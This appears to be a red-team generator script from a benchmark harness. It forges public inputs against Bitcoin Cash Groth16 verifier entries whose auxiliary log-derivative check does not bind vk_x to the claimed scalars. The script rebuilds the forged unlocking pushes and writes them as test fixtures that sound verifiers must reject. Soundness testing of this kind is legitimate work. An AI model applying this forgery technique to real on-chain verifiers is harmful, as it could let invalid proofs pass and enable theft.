// Red-team generator: FORGED PUBLIC INPUTS against the PairFold vk_x auxiliary predicate.
//
// The PairFold family (pairfold5, pairfold5-pevalfuse, pairfold5-densless, pairfold7) does not
// compute vk_x = IC0 + n0*IC1 + n1*IC2 in-script. The genesis input instead takes vk_x plus a
// 704-byte auxiliary polynomial blob and checks a log-derivative ("rational differential")
// identity at a Fiat-Shamir point. That identity holds for ARBITRARY multiplicities, so it does
// not tie vk_x to the claimed scalars (reported by kallisti when withdrawing bench PR #36).
//
// Attack: keep the real proof and the TRUE vk_x (so the pairing still holds), but claim
// different public inputs n0' and rebuild the auxiliary pushes for them. A sound verifier must
// reject. Each forged run is the entry's valid run with only the genesis unlocking replaced.
//
// The tool is self-contained: it finds the genesis input and its public inputs from the entry's
// own pushes, checks that re-deriving the honest auxiliary reproduces them byte for byte, then:
//   - CONTROL: claimed inputs with an honestly recomputed (mismatched) vk_x -> must reject
//   - FORGED:  claimed inputs with the true vk_x                         -> written to the file
// The auxiliary producer is ported from groth16_cashscript chunked/bn254/leader-recovered
// (auxiliary-polynomials.mjs + genesis-auxiliary.mjs), parameterized to split the claimed
// scalars from the scalars used to build vk_x.
//
// Run: pnpm exec tsx --max-old-space-size=8192 tools/forge-public-inputs.mts [id ...]
// Writes src/bch/redteam/<id>.json (read by harness/redteam.ts).
import { createHash } from 'node:crypto';
import { mkdirSync, readFileSync, writeFileSync } from 'node:fs';

import {
  bigIntToVmNumber,
  binToHex,
  decodeAuthenticationInstructions,
  encodeAuthenticationInstruction,
  encodeDataPush,
  sha256,
  vmNumberToBigInt,
} from '@bitauth/libauth';
import { bn254 } from '@noble/curves/bn254.js';

import { REGISTRY } from '../src/harness/benchmark.js';
import { REDTEAM_DIR, redTeamPath } from '../src/harness/redteam.js';
import type { Step } from '../src/harness/types.js';
import { createLoosenedVm, evaluatePair } from '../src/harness/vm.js';

const DEFAULT_IDS = [
  'bch-groth16-intratx-pairfold5-densless',
  'bch-groth16-intratx-pairfold5-pevalfuse',
  'bch-groth16-intratx-pairfold5',
  'bch-groth16-intratx-pairfold7',
];

const P = bn254.fields.Fp.ORDER;
const R = bn254.fields.Fr.ORDER;
const Fp = bn254.fields.Fp;
const G1 = bn254.G1.Point;
type G1P = InstanceType<typeof G1>;
const mod = (x: bigint): bigint => ((x % P) + P) % P;
const inv = (x: bigint): bigint => Fp.inv(mod(x));
const half = (P + 1n) / 2n;
const le32 = (x: bigint): Buffer => Buffer.from(x.toString(16).padStart(64, '0'), 'hex').reverse();

// The fixed BN254 statement shared by every BN254 entry (vk_x = IC0 + in0*IC1 + in1*IC2).
const vk = JSON.parse(readFileSync('src/checkpoints/pairing-vectors.json', 'utf8')).vk as {
  ic: { x: string; y: string }[];
};
const IC = vk.ic.map((p) => G1.fromAffine({ x: BigInt(p.x), y: BigInt(p.y) }));

// ---- ported auxiliary producer (claimed scalars vs vk_x scalars split) ----

const addLine = (a: G1P, b: G1P): { point: G1P; slope: bigint } => {
  if (a.is0()) return { point: b, slope: 0n };
  if (b.is0()) return { point: a, slope: 0n };
  const l = a.toAffine();
  const r = b.toAffine();
  if (l.x === r.x && mod(l.y + r.y) === 0n) return { point: G1.ZERO, slope: 0n };
  const slope = a.equals(b) ? mod(3n * l.x ** 2n * inv(2n * l.y)) : mod((r.y - l.y) * inv(r.x - l.x));
  return { point: a.add(b), slope };
};

const polyMul = (a: bigint[], b: bigint[]): bigint[] => {
  const out = Array<bigint>(a.length + b.length - 1).fill(0n);
  a.forEach((x, i) => b.forEach((y, j) => { out[i + j] = mod(out[i + j]! + x * y); }));
  return out;
};

/** `claimed` feeds the multiplicities / ternary weights; `msm` builds vk_x and its slope sum. */
const auxiliary = (claimed: bigint[], msm: bigint[]) => {
  const expansions = claimed.map((scalar) => {
    let n = scalar, power = 1n, plus = 0n, minus = 0n;
    for (let i = 0; i < 161; i++) {
      let digit = ((n % 3n) + 3n) % 3n;
      if (digit === 2n) digit = -1n;
      if (digit === 1n) plus += power;
      if (digit === -1n) minus += power;
      n = (digit - n) / 3n;
      power *= -3n;
    }
    if (n !== 0n || plus - minus !== scalar) throw new Error('scalar exceeds the fixed ternary loop');
    return { plus, minus };
  });
  const products = msm.map((scalar, input) => {
    let point = G1.ZERO, k = 0n;
    for (const bit of scalar.toString(2)) {
      const d = addLine(point, point);
      k = mod(2n * k + half * d.slope);
      point = d.point;
      if (bit === '1') {
        const a = addLine(point, IC[input + 1]!);
        k = mod(k + half * a.slope);
        point = a.point;
      }
    }
    return { point, k };
  });
  let vkx = IC[0]!, k = mod(products[0]!.k + products[1]!.k);
  for (const p of products) {
    const a = addLine(vkx, p.point);
    k = mod(k + half * a.slope);
    vkx = a.point;
  }
  if (vkx.is0()) throw new Error('vk_x at infinity');
  const points = [...IC, vkx].map((p) => p.toAffine());
  const multiplicities = [1n, ...claimed, -1n];
  const symmetric = [1n, ...expansions.map((e) => e.plus + e.minus), 1n];
  let denominator = [1n];
  for (const p of points) denominator = polyMul(denominator, [mod(-p.x), 1n]);
  const numerator = Array<bigint>(4).fill(0n);
  const secondNumerator = denominator.map((c) => mod(k * c));
  points.forEach((pi, i) => {
    let q = [1n];
    points.forEach((pj, j) => { if (i !== j) q = polyMul(q, [mod(-pj.x), 1n]); });
    q.forEach((c, d) => {
      numerator[d] = mod(numerator[d]! + half * symmetric[i]! * c);
      secondNumerator[d] = mod(secondNumerator[d]! + half * multiplicities[i]! * pi.y * c);
    });
  });
  const secondDenominator = polyMul(denominator, [3n, 0n, 0n, 1n]);
  const blob = Buffer.concat([...numerator, ...denominator, ...secondNumerator, ...secondDenominator].map(le32));
  return { blob, vkx: points[3]!, expansions };
};

/** The 21 genesis pushes 17..37 of the reference layout: 18 values, blob, n1, n0. */
const genesisPushes = (claimed: bigint[], msm: bigint[]): Buffer[] => {
  const aux = auxiliary(claimed, msm);
  const frame = Buffer.concat([...claimed.map(le32), le32(aux.vkx.x), le32(aux.vkx.y), aux.blob]);
  let digest = createHash('sha256').update(frame).digest();
  let x = 0n, y = 0n;
  const skipped: bigint[] = [];
  for (let attempt = 0; attempt <= 2; attempt++) {
    x = mod(vmNumberToBigInt(digest.subarray(0, 31), { requireMinimalEncoding: false }) as bigint);
    const rhs = mod(x * x * x + 3n);
    y = Fp.pow(rhs, (P + 1n) / 4n);
    if (mod(y * y) === rhs) break;
    skipped.push(Fp.pow(mod(3n * rhs), (P + 1n) / 4n));
    digest = createHash('sha256').update(le32(x)).digest();
  }
  if (mod(y * y) !== mod(x * x * x + 3n)) throw new Error('no curve point for transcript');
  const tangent = mod(3n * x * x * inv(2n * y));
  const x2 = mod(tangent * tangent - 2n * x);
  const y2 = mod(tangent * (x - x2) - y);
  const intercept = mod(y - tangent * x);
  const secant = mod((-y2 - y) * inv(x2 - x));
  const derivative = mod(2n * (x - x2) * -y2 * inv(3n * x2 * x2 - 2n * -y2 * secant));
  const pts = [...vk.ic.map((p) => ({ x: BigInt(p.x), y: BigInt(p.y) })), aux.vkx];
  const w = aux.expansions;
  const terms: [{ x: bigint; y: bigint }, bigint, bigint][] = [
    [pts[3]!, -1n, 1n], [pts[2]!, -1n, w[1]!.minus], [pts[2]!, 1n, w[1]!.plus],
    [pts[1]!, -1n, w[0]!.minus], [pts[1]!, 1n, w[0]!.plus], [pts[0]!, -1n, 0n], [pts[0]!, 1n, 1n],
  ];
  const values = terms.map(([p, sign, weight]) => mod((x - p.x) * weight * inv(sign * p.y - tangent * p.x - intercept)));
  const dx = pts.reduce((a, p) => mod(a * (x - p.x)), 1n);
  const dx2 = pts.reduce((a, p) => mod(a * (x2 - p.x)), 1n);
  values.push(inv(dx2 * (x2 ** 3n + 3n)), inv(dx2), inv(dx * (x ** 3n + 3n)), inv(dx), derivative, secant, tangent,
    skipped[1] ?? 0n, skipped[0] ?? 0n, BigInt(skipped.length), y);
  const vmNum = (n: bigint) => Buffer.from(bigIntToVmNumber(n));
  return [...values.map(vmNum), aux.blob, vmNum(claimed[1]!), vmNum(claimed[0]!)];
};

// ---- locate + patch the genesis input of an entry ----

const LONG = 8; // pushes at least this long are matched by value (unambiguous)
const N1 = 19; // index of n1 / n0 within genesisPushes()
const N0 = 20;

type Instr = ReturnType<typeof decodeAuthenticationInstructions>[number];
const dataOf = (i: Instr): Buffer | undefined => ('data' in i ? Buffer.from(i.data) : undefined);

/** Find the input carrying the 704-byte blob and the (n0, n1) whose honest pushes it holds. */
const locate = (valid: Step[]) => {
  for (let input = 0; input < valid.length; input++) {
    const instr = decodeAuthenticationInstructions(valid[input]!.unlockingBytecode);
    const data = instr.map(dataOf);
    const blob = data.find((d) => d?.length === 704);
    if (blob === undefined) continue;
    const scalars = data
      .filter((d): d is Buffer => d !== undefined && d.length > 0 && d.length <= 32)
      .map((d) => vmNumberToBigInt(d, { requireMinimalEncoding: false }))
      .filter((n): n is bigint => typeof n === 'bigint' && n >= 0n && n < R);
    for (const n0 of scalars) {
      for (const n1 of scalars) {
        let honest: Buffer[];
        try {
          if (!auxiliary([n0, n1], [n0, n1]).blob.equals(blob)) continue;
          honest = genesisPushes([n0, n1], [n0, n1]);
        } catch {
          continue;
        }
        const missing = honest.filter((p) => p.length >= LONG && !data.some((d) => d?.equals(p)));
        if (missing.length === 0) return { input, instr, data, truth: [n0, n1], honest };
      }
    }
  }
  return undefined;
};

/** Rewrite the genesis unlocking, replacing each honest push by its forged counterpart. */
const patch = (loc: NonNullable<ReturnType<typeof locate>>, forged: Buffer[]): string => {
  const map = new Map<string, Buffer>();
  loc.honest.forEach((p, i) => {
    const unique = loc.data.filter((d) => d?.equals(p)).length === 1;
    if (p.length >= LONG || ((i === N0 || i === N1) && unique)) map.set(p.toString('hex'), forged[i]!);
  });
  const out = loc.instr.map((ins) => {
    const d = dataOf(ins);
    const to = d === undefined ? undefined : map.get(d.toString('hex'));
    return to === undefined ? Buffer.from(encodeAuthenticationInstruction(ins)) : Buffer.from(encodeDataPush(to));
  });
  return Buffer.concat(out).toString('hex');
};

/** Forged claimed inputs whose short non-input pushes match the honest ones (clean mapping). */
const forgeClaims = (truth: bigint[], honest: Buffer[], which: 0 | 1, count: number) => {
  const found: { claimed: bigint[]; pushes: Buffer[] }[] = [];
  for (let delta = 1n; delta < 2000n && found.length < count; delta++) {
    const claimed = [...truth];
    claimed[which] = (truth[which]! + delta) % R;
    let pushes: Buffer[];
    try {
      pushes = genesisPushes(claimed, truth);
    } catch {
      continue;
    }
    if (honest.every((p, i) => p.length >= LONG || i === N0 || i === N1 || p.equals(pushes[i]!))) found.push({ claimed, pushes });
  }
  return found;
};

const accepts = (valid: Step[], input: number, unlockingHex: string): boolean => {
  const vm = createLoosenedVm();
  const unlockings = valid.map((s, i) => (i === input ? Buffer.from(unlockingHex, 'hex') : s.unlockingBytecode));
  const inputs = valid.map((s, i) => ({ ...s.intraTx!.inputs[i]!, unlockingBytecode: unlockings[i]! }));
  return valid.every((s, i) =>
    evaluatePair(vm, s.lockingBytecode, unlockings[i]!, s.covenant, { index: i, inputs }, s.grouped).accepted);
};

const ids = process.argv.slice(2).length > 0 ? process.argv.slice(2) : DEFAULT_IDS;
mkdirSync(REDTEAM_DIR, { recursive: true });
for (const id of ids) {
  const impl = REGISTRY.find((i) => i.id === id);
  if (impl === undefined) throw new Error(`unknown implementation id: ${id}`);
  const valid = (await impl.load()).valid;
  const loc = locate(valid);
  if (loc === undefined) {
    console.log(`${id}: no PairFold vk_x auxiliary found; not this attack's target`);
    continue;
  }
  const reencoded = Buffer.concat(loc.instr.map((i) => Buffer.from(encodeAuthenticationInstruction(i))));
  if (!reencoded.equals(Buffer.from(valid[loc.input]!.unlockingBytecode))) throw new Error(`${id}: re-encoding drift`);
  if (!accepts(valid, loc.input, patch(loc, loc.honest))) throw new Error(`${id}: honest rebuild rejected`);

  const forgeries = [...forgeClaims(loc.truth, loc.honest, 0, 2), ...forgeClaims(loc.truth, loc.honest, 1, 1)];
  if (forgeries.length === 0) throw new Error(`${id}: no forgery candidate`);
  // control: the same claims with vk_x honestly recomputed for them must be rejected
  const control = forgeries[0]!;
  const controlAccepted = accepts(valid, loc.input, patch(loc, genesisPushes(control.claimed, control.claimed)));

  const runs = forgeries.map(({ claimed, pushes }) => {
    const which = claimed[0] !== loc.truth[0] ? 0 : 1;
    const delta = (claimed[which]! - loc.truth[which]! + R) % R;
    const unlocking = patch(loc, pushes);
    return {
      label: `forged n${which} = true n${which} + ${delta} (true vk_x kept)`,
      kind: 'forged-public-inputs',
      claimedInputs: claimed.map(String),
      acceptedWhenGenerated: accepts(valid, loc.input, unlocking),
      patches: [{ input: loc.input, unlocking }],
    };
  });
  const file = {
    id,
    description:
      'Real proof and true vk_x with FORGED public inputs: the genesis auxiliary pushes (polynomial blob, ' +
      'Fiat-Shamir point values and the claimed scalars) are rebuilt for n\' while vk_x stays the true ' +
      'IC0 + n0*IC1 + n1*IC2. A verifier that binds vk_x to the claimed inputs must reject every run.',
    generator: 'tools/forge-public-inputs.mts',
    trueInputs: loc.truth.map(String),
    genesisInput: loc.input,
    lockingSha256: valid.map((s) => binToHex(sha256.hash(s.lockingBytecode))),
    runs,
  };
  writeFileSync(redTeamPath(id), `${JSON.stringify(file, null, 2)}\n`);
  const acc = runs.filter((r) => r.acceptedWhenGenerated).length;
  console.log(
    `${id}: genesis input ${loc.input}, true inputs (${loc.truth.join(', ')}); control ${controlAccepted ? 'ACCEPTED (unexpected)' : 'rejected'}; ` +
    `forged runs accepted ${acc}/${runs.length} -> ${redTeamPath(id)}`,
  );
}
